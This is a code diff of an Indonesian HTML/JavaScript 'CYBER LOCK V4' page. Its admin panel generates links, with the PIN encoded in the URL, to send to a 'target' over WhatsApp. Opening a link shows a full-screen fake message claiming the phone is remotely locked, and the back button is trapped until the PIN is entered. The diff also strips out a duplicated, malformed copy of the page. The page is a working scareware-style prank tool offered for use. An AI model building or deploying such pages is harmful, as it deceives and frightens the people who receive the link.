@@ -5,75 +5,269 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>CYBER LOCK V4</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body { background: #000; font-family: 'Courier New', monospace; padding: 20px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: #000;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
         
-        /* BOX UTAMA */
-        .main-box { max-width: 500px; margin: 20px auto; background: #0a0a0a; border: 2px solid #ff0055; border-radius: 20px; overflow: hidden; }
-        .box-header { background: #000; padding: 15px; text-align: center; border-bottom: 1px solid #ff0055; }
-        .box-header h1 { color: #ff0055; font-size: 1.3rem; }
-        .box-content { padding: 20px; }
+        /* Kotak utama */
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: #0a0a0a;
+            border: 2px solid #ff0055;
+            border-radius: 20px;
+            overflow: hidden;
+        }
         
-        /* INPUT */
-        input, textarea { width: 100%; background: #1a1a1a; border: 1px solid #ff0055; padding: 12px; color: #ff88aa; border-radius: 10px; margin-bottom: 12px; font-family: monospace; }
+        /* Header */
+        .header {
+            background: #000;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #ff0055;
+        }
+        .header h1 {
+            color: #ff0055;
+            font-size: 1.3rem;
+        }
+        .header p {
+            color: #ff88aa;
+            font-size: 0.7rem;
+            margin-top: 5px;
+        }
         
-        /* TOMBOL GENERATE */
-        .btn-gen { width: 100%; background: #ff0055; border: none; padding: 14px; color: #fff; font-weight: bold; border-radius: 40px; cursor: pointer; font-size: 1rem; }
-        .btn-gen:active { transform: scale(0.97); }
+        /* Isi */
+        .content {
+            padding: 20px;
+        }
         
-        /* BOX ALERT (seperti di gambar) */
-        .alert-box { background: #0a0a0a; border: 2px solid #ff0055; border-radius: 20px; margin: 20px 0; overflow: hidden; }
-        .alert-header { background: #000; padding: 12px; text-align: center; border-bottom: 1px solid #ff0055; }
-        .alert-header h3 { color: #ff0055; font-size: 1rem; }
-        .alert-body { padding: 20px; text-align: center; }
-        .alert-body p { color: #ff88aa; margin: 10px 0; }
-        .pin-highlight { color: #ff0055; font-size: 1.2rem; font-weight: bold; background: #1a1a1a; display: inline-block; padding: 8px 20px; border-radius: 20px; margin: 10px 0; }
+        /* Input dan textarea */
+        input, textarea {
+            width: 100%;
+            background: #1a1a1a;
+            border: 1px solid #ff0055;
+            padding: 12px;
+            color: #ff88aa;
+            border-radius: 10px;
+            margin-bottom: 12px;
+            font-family: monospace;
+            font-size: 14px;
+        }
         
-        /* LINK BOX */
-        .link-box { background: #1a1a1a; padding: 12px; border-radius: 10px; margin: 15px 0; word-break: break-all; font-size: 11px; color: #ff88aa; border: 1px solid #ff0055; }
+        /* Tombol utama */
+        .btn-gen {
+            width: 100%;
+            background: #ff0055;
+            border: none;
+            padding: 14px;
+            color: white;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+        .btn-gen:active {
+            transform: scale(0.97);
+        }
         
-        /* TOMBOL ROW */
-        .btn-row { display: flex; gap: 10px; }
-        .btn-row button { flex: 1; padding: 12px; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }
-        .btn-copy { background: #00aa33; color: #fff; }
-        .btn-wa { background: #25D366; color: #fff; }
+        /* Box alert (hasil generate) */
+        .alert-box {
+            background: #0a0a0a;
+            border: 2px solid #ff0055;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .alert-header {
+            background: #000;
+            padding: 12px;
+            text-align: center;
+            border-bottom: 1px solid #ff0055;
+        }
+        .alert-header h3 {
+            color: #ff0055;
+            font-size: 1rem;
+        }
+        .alert-body {
+            padding: 20px;
+            text-align: center;
+        }
+        .alert-body p {
+            color: #ff88aa;
+            margin: 10px 0;
+        }
+        .pin-badge {
+            color: #ff0055;
+            font-size: 1.2rem;
+            font-weight: bold;
+            background: #1a1a1a;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+            margin: 10px 0;
+        }
         
-        .hidden { display: none; }
+        /* Link box */
+        .link-box {
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-size: 11px;
+            color: #ff88aa;
+            border: 1px solid #ff0055;
+        }
         
-        /* LOCK SCREEN */
-        .lockscreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; display: flex; justify-content: center; align-items: center; }
-        .lock-box { background: #111; border: 3px solid #ff0055; border-radius: 30px; padding: 25px; width: 90%; max-width: 340px; text-align: center; }
-        .lock-title { color: #ff0055; font-size: 1.6rem; margin-bottom: 15px; }
-        .lock-msg { color: #ff88aa; margin-bottom: 25px; font-size: 0.9rem; white-space: pre-wrap; }
-        .pin-display { background: #000; border: 2px solid #ff0055; padding: 12px; font-size: 2rem; letter-spacing: 8px; color: #ff0055; border-radius: 15px; margin-bottom: 20px; }
-        .pin-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px; }
-        .pin-btn { background: #1a1a1a; border: 1px solid #ff0055; padding: 14px; font-size: 1.3rem; color: #ff88aa; border-radius: 12px; cursor: pointer; text-align: center; }
-        .error-msg { color: #ff5555; margin-top: 10px; }
+        /* Tombol row */
+        .btn-row {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-row button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-copy {
+            background: #00aa33;
+            color: white;
+        }
+        .btn-wa {
+            background: #25D366;
+            color: white;
+        }
+        .btn-copy:active, .btn-wa:active {
+            transform: scale(0.97);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* LOCK SCREEN - tampilan saat target buka link */
+        .lockscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 99999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .lock-box {
+            background: #111;
+            border: 3px solid #ff0055;
+            border-radius: 30px;
+            padding: 25px;
+            width: 90%;
+            max-width: 340px;
+            text-align: center;
+        }
+        .lock-title {
+            color: #ff0055;
+            font-size: 1.6rem;
+            margin-bottom: 15px;
+        }
+        .lock-msg {
+            color: #ff88aa;
+            margin-bottom: 25px;
+            font-size: 0.9rem;
+            white-space: pre-wrap;
+        }
+        .pin-display {
+            background: #000;
+            border: 2px solid #ff0055;
+            padding: 12px;
+            font-size: 2rem;
+            letter-spacing: 8px;
+            color: #ff0055;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .pin-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .pin-btn {
+            background: #1a1a1a;
+            border: 1px solid #ff0055;
+            padding: 15px;
+            font-size: 1.3rem;
+            color: #ff88aa;
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+        .pin-btn:active {
+            background: #ff0055;
+            color: white;
+        }
+        .btn-unlock {
+            width: 100%;
+            background: #ff0055;
+            border: none;
+            padding: 12px;
+            color: white;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        .error-msg {
+            color: #ff5555;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
+<!-- ADMIN PANEL (buat Meowh generate link) -->
 <div id="adminPanel">
-    <div class="main-box">
-        <div class="box-header"><h1>💀 CYBER LOCK V4 💀</h1></div>
-        <div class="box-content">
+    <div class="container">
+        <div class="header">
+            <h1>💀 CYBER LOCK V4 💀</h1>
+            <p>tanpa sensor · tanpa filter</p>
+        </div>
+        <div class="content">
             <input type="text" id="targetName" placeholder="Nama Locker" value="ABIEZ 😂😁">
             <input type="text" id="lockPin" placeholder="PIN (4-6 digit)" value="140924" maxlength="6">
             <textarea id="lockMsg" rows="2" placeholder="Pesan lockscreen">⚠️ HP ANDA TERKUNCI REMOTE ⚠️</textarea>
+            
             <button class="btn-gen" id="btnGen">🔒 GENERATE LOCK LINK</button>
             
             <div id="resultArea" class="hidden">
-                <!-- BOX ALERT SEPERTI DI GAMBAR -->
                 <div class="alert-box">
                     <div class="alert-header"><h3>🔒 GENERATE LOCK LINK</h3></div>
                     <div class="alert-body">
                         <p>✅ LINK BERHASIL DIBUAT!</p>
-                        <div class="pin-highlight" id="displayPin">PIN: 140924</div>
+                        <div class="pin-badge" id="displayPin">PIN: 140924</div>
                         <p>Kirim link ke target.</p>
                     </div>
                 </div>
                 
-                <!-- BOX LINK -->
                 <div class="alert-box">
                     <div class="alert-body">
                         <div class="link-box" id="linkText"></div>
@@ -88,126 +282,7 @@
     </div>
 </div>
 
-<div id="lockScreen" class="lockscreen" style="display: none;">
-    <div class="lock-box">
-        <div class="lock-title" id="displayTitle">🔒 LOCKED</div>
-        <div class="lock-msg" id="displayMsg"></div>
-        <div class="pin-display" id="pinDisplay">____</div>
-        <div class="pin-grid" id="pinGrid">
-            <div class="pin-btn" data-pin="1">1</div><div class="pin-btn" data-pin="2">2</div><div class="pin-btn" data-pin="3">3</div>
-            <div class="pin-btn" data-pin="4">4</div><div class="pin-btn" data-pin="5">5</div><div class="pin-btn" data-pin="6">6</div>
-            <div class="pin-btn" data-pin="7">7</div><div class="pin-btn" data-pin="8">8</div><div class="pin-btn" data-pin="9">9</div>
-            <div class="pin-btn" data-pin="DEL">⌫</div><div class="pin-btn" data-pin="0">0</div><div class="pin-btn" data-pin="CLR">C</div>
-        </div>
-        <button id="unlockBtn">🔓 BUKA KUNCI</button>
-        <div id="lockError" class="error-msg"></div>
-    </div>
-</div>
-
-<script>
-const admin = document.getElementById('adminPanel');
-const lockScr = document.getElementById('lockScreen');
-const targetName = document.getElementById('targetName');
-const lockPin = document.getElementById('lockPin');
-const lockMsg = document.getElementById('lockMsg');
-const btnGen = document.getElementById('btnGen');
-const resultArea = document.getElementById('resultArea');
-const linkText = document.getElementById('linkText');
-const btnCopy = document.getElementById('btnCopy');
-const btnWA = document.getElementById('btnWA');
-const displayPin = document.getElementById('displayPin');
-const displayTitle = document.getElementById('displayTitle');
-const displayMsg = document.getElementById('displayMsg');
-const pinDisplay = document.getElementById('pinDisplay');
-const unlockBtn = document.getElementById('unlockBtn');
-const lockError = document.getElementById('lockError');
-
-let current = "", savedPin = "", savedTitle = "", savedMsg = "";
-
-function setupPins() {
-    document.querySelectorAll('#pinGrid .pin-btn').forEach(btn => {
-        btn.onclick = () => {
-            let v = btn.getAttribute('data-pin');
-            if (v === 'DEL') current = current.slice(0, -1);
-            else if (v === 'CLR') current = "";
-            else if (current.length < 6) current += v;
-            pinDisplay.innerText = current.padEnd(4, '_').substring(0, 6);
-            lockError.innerText = "";
-        };
-    });
-}
-
-function showLock(pin, title, msg) {
-    savedPin = pin; savedTitle = title; savedMsg = msg; current = "";
-    displayTitle.innerText = title;
-    displayMsg.innerText = msg;
-    pinDisplay.innerText = "____";
-    lockError.innerText = "";
-    admin.style.display = "none";
-    lockScr.style.display = "flex";
-    document.body.style.overflow = "hidden";
-    setupPins();
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => history.go(1);
-}
-
-function closeLock() {
-    admin.style.display = "block";
-    lockScr.style.display = "none";
-    document.body.style.overflow = "";
-    window.onpopstate = null;
-}
-
-unlockBtn.onclick = () => {
-    if (current === savedPin) {
-        alert("✅ BERHASIL DIBUKA!");
-        closeLock();
-    } else {
-        lockError.innerText = "❌ PIN SALAH YA SAYANG!";
-        current = "";
-        pinDisplay.innerText = "____";
-        if (navigator.vibrate) navigator.vibrate(200);
-    }
-};
-
-btnGen.onclick = () => {
-    let name = targetName.value.trim() || "LOCKED";
-    let pin = lockPin.value.trim();
-    let msg = lockMsg.value.trim() || "⚠️ HP ANDA TERKUNCI! ⚠️";
-    
-    if (!pin || pin.length < 4) { alert("PIN minimal 4 digit!"); return; }
-    
-    let data = btoa(JSON.stringify({ pin: pin, title: "🔒 " + name + " 🔒", msg: msg }));
-    let link = window.location.href.split('?')[0] + '?lock=' + encodeURIComponent(data);
-    
-    linkText.innerText = link;
-    displayPin.innerText = "PIN: " + pin;
-    resultArea.classList.remove('hidden');
-};
-
-btnCopy.onclick = () => { navigator.clipboard.writeText(linkText.innerText); alert("✅ Link disalin!"); };
-btnWA.onclick = () => {
-    let link = linkText.innerText;
-    let pin = lockPin.value.trim();
-    let name = targetName.value.trim() || "LOCK";
-    let waMsg = `🔒 *${name}* 🔒\n\n⚠️ HP ANDA AKAN TERKUNCI!\n\nLink: ${link}\n\nPassword: *${pin}*`;
-    window.open('https://wa.me/?text=' + encodeURIComponent(waMsg), '_blank');
-};
-
-function checkUrl() {
-    let params = new URLSearchParams(window.location.search);
-    let lockData = params.get('lock');
-    if (lockData) {
-        try { let data = JSON.parse(atob(lockData)); if (data.pin && data.title && data.msg) showLock(data.pin, data.title, data.msg);
-        window.history.replaceState({}, document.title, window.location.pathname); } catch(e) {}
-    }
-}
-checkUrl();
-</script>
-</body>
-</html></div>
-
-<!-- LOCK SCREEN -->
+<!-- LOCK SCREEN (tampil di HP target) -->
 <div id="lockScreen" class="lockscreen" style="display: none;">
     <div class="lock-box">
         <div class="lock-title" id="displayTitle">🔒 LOCKED</div>
@@ -227,148 +302,172 @@ checkUrl();
             <div class="pin-btn" data-pin="0">0</div>
             <div class="pin-btn" data-pin="CLR">C</div>
         </div>
-        <button id="unlockBtn">🔓 BUKA KUNCI</button>
+        <button class="btn-unlock" id="unlockBtn">🔓 BUKA KUNCI</button>
         <div id="lockError" class="error-msg"></div>
     </div>
 </div>
 
 <script>
-// ========== ELEMEN ==========
-const adminPanel = document.getElementById('adminPanel');
-const lockScreen = document.getElementById('lockScreen');
-const targetName = document.getElementById('targetName');
-const lockPin = document.getElementById('lockPin');
-const lockMsg = document.getElementById('lockMsg');
-const btnGen = document.getElementById('btnGen');
-const resultArea = document.getElementById('resultArea');
-const linkText = document.getElementById('linkText');
-const btnCopy = document.getElementById('btnCopy');
-const btnWA = document.getElementById('btnWA');
-const displayTitle = document.getElementById('displayTitle');
-const displayMsg = document.getElementById('displayMsg');
-const pinDisplay = document.getElementById('pinDisplay');
-const unlockBtn = document.getElementById('unlockBtn');
-const lockError = document.getElementById('lockError');
-
-let currentPin = "";
-let savedPin = "";
-let savedTitle = "";
-let savedMsg = "";
-
-// ========== PIN BUTTONS ==========
-function setupPinButtons() {
-    document.querySelectorAll('#pinGrid .pin-btn').forEach(btn => {
-        btn.onclick = () => {
-            let val = btn.getAttribute('data-pin');
-            if (val === 'DEL') {
-                currentPin = currentPin.slice(0, -1);
-            } else if (val === 'CLR') {
-                currentPin = "";
-            } else {
-                if (currentPin.length < 6) currentPin += val;
-            }
-            let display = currentPin.padEnd(4, '_').substring(0, 6);
-            pinDisplay.innerText = display;
-            lockError.innerText = "";
-        };
-    });
-}
-
-// ========== SHOW LOCK ==========
-function showLockScreen(pin, title, msg) {
-    savedPin = pin;
-    savedTitle = title;
-    savedMsg = msg;
-    currentPin = "";
-    displayTitle.innerText = title;
-    displayMsg.innerText = msg;
-    pinDisplay.innerText = "____";
-    lockError.innerText = "";
-    adminPanel.style.display = "none";
-    lockScreen.style.display = "flex";
-    document.body.style.overflow = "hidden";
-    setupPinButtons();
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => history.go(1);
-}
-
-// ========== CLOSE LOCK ==========
-function closeLockScreen() {
-    adminPanel.style.display = "block";
-    lockScreen.style.display = "none";
-    document.body.style.overflow = "";
-    window.onpopstate = null;
-}
-
-// ========== UNLOCK ==========
-unlockBtn.onclick = () => {
-    if (currentPin === savedPin) {
-        alert("✅ BERHASIL DIBUKA!");
-        closeLockScreen();
-    } else {
-        lockError.innerText = "❌ PIN SALAH YA SAYANG!";
+    // ========== AMBIL ELEMEN ==========
+    const adminPanel = document.getElementById('adminPanel');
+    const lockScreen = document.getElementById('lockScreen');
+    const targetName = document.getElementById('targetName');
+    const lockPin = document.getElementById('lockPin');
+    const lockMsg = document.getElementById('lockMsg');
+    const btnGen = document.getElementById('btnGen');
+    const resultArea = document.getElementById('resultArea');
+    const linkText = document.getElementById('linkText');
+    const btnCopy = document.getElementById('btnCopy');
+    const btnWA = document.getElementById('btnWA');
+    const displayPinElem = document.getElementById('displayPin');
+    const displayTitle = document.getElementById('displayTitle');
+    const displayMsg = document.getElementById('displayMsg');
+    const pinDisplay = document.getElementById('pinDisplay');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const lockError = document.getElementById('lockError');
+    
+    let currentPin = "";
+    let savedPin = "";
+    let savedTitle = "";
+    let savedMsg = "";
+    
+    // ========== FUNGSI PIN ==========
+    function setupPinButtons() {
+        const btns = document.querySelectorAll('#pinGrid .pin-btn');
+        for (let i = 0; i < btns.length; i++) {
+            btns[i].onclick = function() {
+                let val = this.getAttribute('data-pin');
+                if (val === 'DEL') {
+                    currentPin = currentPin.slice(0, -1);
+                } else if (val === 'CLR') {
+                    currentPin = "";
+                } else {
+                    if (currentPin.length < 6) currentPin += val;
+                }
+                let display = currentPin;
+                while (display.length < 4) display += "_";
+                if (display.length > 6) display = display.substring(0, 6);
+                pinDisplay.innerText = display;
+                lockError.innerText = "";
+            };
+        }
+    }
+    
+    // ========== TAMPILKAN LOCK ==========
+    function showLock(pin, title, msg) {
+        savedPin = pin;
+        savedTitle = title;
+        savedMsg = msg;
         currentPin = "";
+        displayTitle.innerText = title;
+        displayMsg.innerText = msg;
         pinDisplay.innerText = "____";
-        if (navigator.vibrate) navigator.vibrate(200);
-    }
-};
-
-// ========== GENERATE LINK ==========
-btnGen.onclick = () => {
-    let name = targetName.value.trim() || "LOCKED";
-    let pin = lockPin.value.trim();
-    let msg = lockMsg.value.trim() || "⚠️ HP ANDA TERKUNCI! ⚠️";
-    
-    if (!pin || pin.length < 4) {
-        alert("PIN minimal 4 digit!");
-        return;
+        lockError.innerText = "";
+        adminPanel.style.display = "none";
+        lockScreen.style.display = "flex";
+        document.body.style.overflow = "hidden";
+        setupPinButtons();
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() { history.go(1); };
     }
     
-    let data = btoa(JSON.stringify({
-        pin: pin,
-        title: "🔒 " + name + " 🔒",
-        msg: msg
-    }));
+    // ========== TUTUP LOCK ==========
+    function closeLock() {
+        adminPanel.style.display = "block";
+        lockScreen.style.display = "none";
+        document.body.style.overflow = "";
+        window.onpopstate = null;
+    }
     
-    let link = window.location.href.split('?')[0] + '?lock=' + encodeURIComponent(data);
-    linkText.innerText = link;
-    resultArea.classList.remove('hidden');
+    // ========== TOMBOL UNLOCK ==========
+    unlockBtn.onclick = function() {
+        if (currentPin === savedPin) {
+            alert("✅ BERHASIL DIBUKA!");
+            closeLock();
+        } else {
+            lockError.innerText = "❌ PIN SALAH YA SAYANG!";
+            currentPin = "";
+            pinDisplay.innerText = "____";
+            if (navigator.vibrate) navigator.vibrate(200);
+        }
+    };
     
-    // TAMPILAN ALERT BOX SEPERTI DI GAMBAR
-    alert("┌─────────────────────────────────┐\n│  🔒 GENERATE LOCK LINK          │\n├─────────────────────────────────┤\n│  ✅ LINK BERHASIL DIBUAT!       │\n│                                 │\n│  PIN: " + pin + "                    │\n│                                 │\n│  Kirim link ke target.          │\n└─────────────────────────────────┘");
-};
-
-// ========== COPY LINK ==========
-btnCopy.onclick = () => {
-    navigator.clipboard.writeText(linkText.innerText);
-    alert("✅ Link disalin!");
-};
-
-// ========== KIRIM WA ==========
-btnWA.onclick = () => {
-    let link = linkText.innerText;
-    let pin = lockPin.value.trim();
-    let name = targetName.value.trim() || "LOCK";
-    let waMsg = `🔒 *${name}* 🔒\n\n⚠️ HP ANDA AKAN TERKUNCI!\n\nLink: ${link}\n\nPassword: *${pin}*`;
-    window.open('https://wa.me/?text=' + encodeURIComponent(waMsg), '_blank');
-};
-
-// ========== CEK URL ==========
-function checkUrl() {
-    let params = new URLSearchParams(window.location.search);
-    let lockData = params.get('lock');
-    if (lockData) {
-        try {
-            let data = JSON.parse(atob(lockData));
-            if (data.pin && data.title && data.msg) {
-                showLockScreen(data.pin, data.title, data.msg);
-                window.history.replaceState({}, document.title, window.location.pathname);
+    // ========== GENERATE LINK ==========
+    btnGen.onclick = function() {
+        let name = targetName.value.trim();
+        let pin = lockPin.value.trim();
+        let msg = lockMsg.value.trim();
+        
+        if (name === "") name = "LOCKED";
+        if (pin === "") {
+            alert("Masukkan PIN dulu!");
+            return;
+        }
+        if (pin.length < 4) {
+            alert("PIN minimal 4 digit!");
+            return;
+        }
+        if (msg === "") msg = "⚠️ HP ANDA TERKUNCI! ⚠️";
+        
+        let dataObj = {
+            pin: pin,
+            title: "🔒 " + name + " 🔒",
+            msg: msg
+        };
+        let dataString = JSON.stringify(dataObj);
+        let dataBase64 = btoa(dataString);
+        let url = window.location.href.split('?')[0] + '?lock=' + encodeURIComponent(dataBase64);
+        
+        linkText.innerText = url;
+        displayPinElem.innerText = "PIN: " + pin;
+        resultArea.classList.remove('hidden');
+        
+        alert("┌─────────────────────────────────┐\n│  🔒 GENERATE LOCK LINK          │\n├─────────────────────────────────┤\n│  ✅ LINK BERHASIL DIBUAT!       │\n│                                 │\n│  PIN: " + pin + "                    │\n│                                 │\n│  Kirim link ke target.          │\n└─────────────────────────────────┘");
+    };
+    
+    // ========== COPY LINK ==========
+    btnCopy.onclick = function() {
+        let link = linkText.innerText;
+        if (link) {
+            navigator.clipboard.writeText(link);
+            alert("✅ Link disalin!");
+        } else {
+            alert("Belum ada link, generate dulu!");
+        }
+    };
+    
+    // ========== KIRIM WA ==========
+    btnWA.onclick = function() {
+        let link = linkText.innerText;
+        let pin = lockPin.value.trim();
+        let name = targetName.value.trim() || "LOCK";
+        if (!link) {
+            alert("Generate link dulu!");
+            return;
+        }
+        let waMsg = "🔒 *" + name + "* 🔒\n\n⚠️ HP ANDA AKAN TERKUNCI!\n\nLink: " + link + "\n\nPassword: *" + pin + "*";
+        window.open('https://wa.me/?text=' + encodeURIComponent(waMsg), '_blank');
+    };
+    
+    // ========== CEK URL LOCK ==========
+    function checkUrl() {
+        let params = new URLSearchParams(window.location.search);
+        let lockParam = params.get('lock');
+        if (lockParam) {
+            try {
+                let decoded = atob(lockParam);
+                let data = JSON.parse(decoded);
+                if (data.pin && data.title && data.msg) {
+                    showLock(data.pin, data.title, data.msg);
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                }
+            } catch(e) {
+                console.log("Error:", e);
             }
-        } catch(e) {}
+        }
     }
-}
-
-checkUrl();
+    
+    checkUrl();
 </script>
 </body>
-  </html>
+</html>
